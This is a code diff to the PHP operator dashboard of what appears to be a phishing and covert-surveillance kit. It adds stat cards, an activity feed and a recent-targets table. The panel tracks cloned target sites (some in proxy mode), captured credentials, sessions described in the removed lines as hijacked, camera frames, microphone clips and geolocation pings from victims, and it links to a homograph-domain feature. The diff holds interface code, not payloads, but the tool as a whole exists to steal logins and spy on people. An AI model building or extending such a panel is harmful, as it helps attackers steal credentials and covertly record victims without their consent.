@@ -78,6 +78,10 @@ if ($route !== 'home' && isset($badge_map[$route])) {
         <p class="panel-page-sub"><?= htmlspecialchars($page['sub']) ?></p>
       </div>
       <div class="panel-page-actions">
+        <a href="panel.php?route=targets" class="panel-cta" title="Create a new target">
+          <svg class="icon icon-sm"><use href="#i-plus"/></svg>
+          <span>New Target</span>
+        </a>
         <div class="notif-wrap">
           <button class="icon-btn notif-btn" id="notif-btn" type="button"
                   aria-label="Notifications" aria-haspopup="true" aria-expanded="false">
@@ -106,6 +110,7 @@ if ($route !== 'home' && isset($badge_map[$route])) {
         <button class="icon-btn" aria-label="Account settings" type="button" onclick="openModal('modal-settings')">
           <svg class="icon icon-md"><use href="#i-settings"/></svg>
         </button>
+        <span class="user-avatar" title="<?= htmlspecialchars(auth_user() ?? 'admin') ?>"><?= strtoupper(substr(auth_user() ?? 'A', 0, 1)) ?></span>
       </div>
     </div>
 
@@ -117,49 +122,250 @@ if ($route !== 'home' && isset($badge_map[$route])) {
       $dash_targets  = (int) $db->query("SELECT COUNT(*) FROM targets")->fetchColumn();
       $dash_creds    = (int) $db->query("SELECT COUNT(*) FROM events WHERE kind='cred'")->fetchColumn();
       $dash_sessions = (int) $db->query("SELECT COUNT(*) FROM sessions")->fetchColumn();
+
+      // Activity feed — last 8 events/media combined
+      $activity = $db->query("
+          SELECT 'event' as source, kind, target_slug, captured_at
+          FROM events
+          UNION ALL
+          SELECT 'media' as source, kind, target_slug, captured_at
+          FROM media
+          ORDER BY captured_at DESC
+          LIMIT 8
+      ")->fetchAll(PDO::FETCH_ASSOC);
+
+      // Recent targets with last activity
+      $recent_targets = $db->query("
+          SELECT t.slug, t.url, t.mode, t.created_at,
+                 MAX(
+                     COALESCE((SELECT MAX(captured_at) FROM events WHERE target_slug = t.slug), 0),
+                     COALESCE((SELECT MAX(captured_at) FROM media WHERE target_slug = t.slug), 0),
+                     t.created_at
+                 ) as last_activity
+          FROM targets t
+          ORDER BY last_activity DESC
+          LIMIT 5
+      ")->fetchAll(PDO::FETCH_ASSOC);
+
+      // System health
+      $db_path = realpath(__DIR__ . '/data/storm.db');
+      $db_size = $db_path && file_exists($db_path) ? filesize($db_path) : 0;
+      $total_events = (int) $db->query("SELECT COUNT(*) FROM events")->fetchColumn();
+      $total_media  = (int) $db->query("SELECT COUNT(*) FROM media")->fetchColumn();
+
+      // Helper: relative time
+      if (!function_exists('dash_relative_time')):
+      function dash_relative_time(int $ts): string {
+          $diff = max(0, time() - $ts);
+          if ($diff < 60)    return $diff . 's ago';
+          if ($diff < 3600)  return floor($diff / 60) . 'm ago';
+          if ($diff < 86400) return floor($diff / 3600) . 'h ago';
+          return floor($diff / 86400) . 'd ago';
+      }
+      function dash_format_bytes(int $bytes): string {
+          if ($bytes < 1024) return $bytes . ' B';
+          if ($bytes < 1048576) return round($bytes / 1024, 1) . ' KB';
+          return round($bytes / 1048576, 1) . ' MB';
+      }
+      endif;
+
+      $kind_meta = [
+          'camera' => ['icon' => 'i-camera',    'label' => 'Camera capture',  'css' => 'camera'],
+          'mic'    => ['icon' => 'i-mic',        'label' => 'Audio clip',      'css' => 'mic'],
+          'geo'    => ['icon' => 'i-map-pin',    'label' => 'Geo ping',        'css' => 'geo'],
+          'cred'   => ['icon' => 'i-key',        'label' => 'Credential',      'css' => 'cred'],
+          'device' => ['icon' => 'i-cpu',        'label' => 'Device info',     'css' => 'device'],
+      ];
     ?>
+      <!-- ── KPI STAT CARDS ───────────────────────────────── -->
       <div class="stat-grid">
-        <div class="stat-card">
-          <div class="stat-label">Captures</div>
+        <a href="panel.php?route=captures" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon cyan"><svg class="icon icon-sm"><use href="#i-camera"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
           <div class="stat-value cyan"><?= $dash_captures ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_captures ? 'camera frames' : 'awaiting data' ?></div>
-        </div>
-        <div class="stat-card">
+          <div class="stat-label">Captures</div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_captures ? $dash_captures . ' camera frames' : 'no data yet' ?></div>
+        </a>
+        <a href="panel.php?route=audio" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon purple"><svg class="icon icon-sm"><use href="#i-mic"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
+          <div class="stat-value purple"><?= $dash_audio ?></div>
           <div class="stat-label">Audio</div>
-          <div class="stat-value"><?= $dash_audio ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_audio ? 'mic clips' : 'awaiting data' ?></div>
-        </div>
-        <div class="stat-card">
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_audio ? $dash_audio . ' mic clips' : 'no data yet' ?></div>
+        </a>
+        <a href="panel.php?route=geo" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon amber"><svg class="icon icon-sm"><use href="#i-map-pin"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
+          <div class="stat-value amber"><?= $dash_geo ?></div>
           <div class="stat-label">Geo Pings</div>
-          <div class="stat-value"><?= $dash_geo ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_geo ? 'location pings' : 'awaiting data' ?></div>
-        </div>
-        <div class="stat-card">
-          <div class="stat-label">Targets</div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_geo ? $dash_geo . ' location pings' : 'no data yet' ?></div>
+        </a>
+        <a href="panel.php?route=targets" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon green"><svg class="icon icon-sm"><use href="#i-target"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
           <div class="stat-value green"><?= $dash_targets ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_targets ? 'active clones' : 'awaiting data' ?></div>
-        </div>
-        <div class="stat-card">
+          <div class="stat-label">Targets</div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_targets ? $dash_targets . ' active clones' : 'none created' ?></div>
+        </a>
+        <a href="panel.php?route=credentials" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon red"><svg class="icon icon-sm"><use href="#i-key"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
+          <div class="stat-value red"><?= $dash_creds ?></div>
           <div class="stat-label">Credentials</div>
-          <div class="stat-value" style="color:var(--accent-red)"><?= $dash_creds ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_creds ? 'captured logins' : 'awaiting data' ?></div>
-        </div>
-        <div class="stat-card">
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_creds ? $dash_creds . ' captured logins' : 'no data yet' ?></div>
+        </a>
+        <a href="panel.php?route=sessions" class="stat-card stat-card-link">
+          <div class="stat-card-head">
+            <span class="stat-card-icon amber"><svg class="icon icon-sm"><use href="#i-lock"/></svg></span>
+            <svg class="icon icon-xs stat-card-arrow"><use href="#i-arrow-right"/></svg>
+          </div>
+          <div class="stat-value amber"><?= $dash_sessions ?></div>
           <div class="stat-label">Sessions</div>
-          <div class="stat-value" style="color:var(--accent-warn,#f5a524)"><?= $dash_sessions ?></div>
-          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_sessions ? 'hijacked sessions' : 'awaiting data' ?></div>
+          <div class="stat-change" style="color:var(--text-muted)">// <?= $dash_sessions ? $dash_sessions . ' active sessions' : 'no data yet' ?></div>
+        </a>
+      </div>
+
+      <!-- ── DASHBOARD GRID (activity + side panel) ───────── -->
+      <div class="dash-grid">
+        <!-- Left column: Activity Feed -->
+        <div>
+          <div class="dash-section">
+            <div class="dash-section-header">
+              <svg class="icon"><use href="#i-activity"/></svg>
+              <span>Activity Feed</span>
+            </div>
+            <?php if (empty($activity)): ?>
+            <div class="empty-state">
+              <svg class="icon"><use href="#i-activity"/></svg>
+              <div class="empty-state-text">No activity yet</div>
+              <div class="empty-state-sub">// events appear here as targets engage</div>
+              <a href="panel.php?route=targets" class="empty-state-action">+ Create your first target</a>
+            </div>
+            <?php else: ?>
+            <ul class="feed-list">
+              <?php foreach ($activity as $ev):
+                $meta = $kind_meta[$ev['kind']] ?? ['icon' => 'i-bell', 'label' => $ev['kind'], 'css' => ''];
+              ?>
+              <li class="feed-item">
+                <span class="feed-icon <?= htmlspecialchars($meta['css']) ?>">
+                  <svg class="icon icon-sm"><use href="#<?= $meta['icon'] ?>"/></svg>
+                </span>
+                <div class="feed-text">
+                  <span class="feed-kind"><?= htmlspecialchars($meta['label']) ?></span>
+                  <span class="feed-target">/<?= htmlspecialchars($ev['target_slug']) ?></span>
+                </div>
+                <span class="feed-time"><?= dash_relative_time((int)$ev['captured_at']) ?></span>
+              </li>
+              <?php endforeach; ?>
+            </ul>
+            <?php endif; ?>
+          </div>
+        </div>
+
+        <!-- Right column: Quick Actions + System Health -->
+        <div>
+          <div class="dash-section">
+            <div class="dash-section-header">
+              <svg class="icon"><use href="#i-zap"/></svg>
+              <span>Quick Actions</span>
+            </div>
+            <div class="quick-actions-grid">
+              <a href="panel.php?route=targets" class="quick-btn">
+                <svg class="icon"><use href="#i-plus"/></svg>
+                New Target
+              </a>
+              <a href="panel.php?route=captures" class="quick-btn">
+                <svg class="icon"><use href="#i-camera"/></svg>
+                Captures
+              </a>
+              <a href="panel.php?route=credentials" class="quick-btn">
+                <svg class="icon"><use href="#i-key"/></svg>
+                Credentials
+              </a>
+              <a href="panel.php?route=homograph" class="quick-btn">
+                <svg class="icon"><use href="#i-globe"/></svg>
+                Homograph
+              </a>
+            </div>
+          </div>
+
+          <div class="dash-section">
+            <div class="dash-section-header">
+              <svg class="icon"><use href="#i-server"/></svg>
+              <span>System Health</span>
+            </div>
+            <div class="health-list">
+              <div class="health-row">
+                <span class="health-label"><span class="health-dot"></span>Status</span>
+                <span class="health-value" style="color:var(--accent-green)">Operational</span>
+              </div>
+              <div class="health-row">
+                <span class="health-label">PHP</span>
+                <span class="health-value"><?= PHP_MAJOR_VERSION . '.' . PHP_MINOR_VERSION ?></span>
+              </div>
+              <div class="health-row">
+                <span class="health-label">Database</span>
+                <span class="health-value"><?= dash_format_bytes($db_size) ?></span>
+              </div>
+              <div class="health-row">
+                <span class="health-label">Total events</span>
+                <span class="health-value"><?= number_format($total_events) ?></span>
+              </div>
+              <div class="health-row">
+                <span class="health-label">Total media</span>
+                <span class="health-value"><?= number_format($total_media) ?></span>
+              </div>
+            </div>
+          </div>
         </div>
       </div>
 
-      <?php if ($dash_targets === 0): ?>
-      <div class="alert alert-info">
-        <div class="alert-icon"><svg class="icon icon-md"><use href="#i-info"/></svg></div>
-        <div class="alert-content">
-          <div class="alert-title">PANEL READY</div>
-          <div class="alert-body">Use the sidebar to navigate. Capture views, audio, and geo data will populate as targets engage.</div>
+      <!-- ── RECENT TARGETS TABLE ─────────────────────────── -->
+      <div class="dash-section">
+        <div class="dash-section-header">
+          <svg class="icon"><use href="#i-target"/></svg>
+          <span>Recent Targets</span>
         </div>
+        <?php if (empty($recent_targets)): ?>
+        <div class="empty-state">
+          <svg class="icon"><use href="#i-target"/></svg>
+          <div class="empty-state-text">No targets yet</div>
+          <div class="empty-state-sub">// clone a URL to get started</div>
+          <a href="panel.php?route=targets" class="empty-state-action">+ Create target</a>
+        </div>
+        <?php else: ?>
+        <table class="recent-table">
+          <thead>
+            <tr>
+              <th>Slug</th>
+              <th>URL</th>
+              <th>Mode</th>
+              <th>Last Activity</th>
+            </tr>
+          </thead>
+          <tbody>
+            <?php foreach ($recent_targets as $t): ?>
+            <tr>
+              <td><a href="panel.php?route=targets" class="target-slug"><?= htmlspecialchars($t['slug']) ?></a></td>
+              <td><span class="target-url" title="<?= htmlspecialchars($t['url']) ?>"><?= htmlspecialchars($t['url']) ?></span></td>
+              <td><span class="mode-badge <?= $t['mode'] === 'proxy' ? 'proxy' : '' ?>"><?= htmlspecialchars($t['mode']) ?></span></td>
+              <td style="font-family:var(--font-mono);font-size:var(--text-xs);color:var(--text-muted)"><?= dash_relative_time((int)$t['last_activity']) ?></td>
+            </tr>
+            <?php endforeach; ?>
+          </tbody>
+        </table>
+        <?php endif; ?>
       </div>
-      <?php endif; ?>
     <?php elseif ($route === 'targets'): ?>
       <?php include "./assets/components/route-targets.php"; ?>
     <?php elseif ($route === 'captures'): ?>
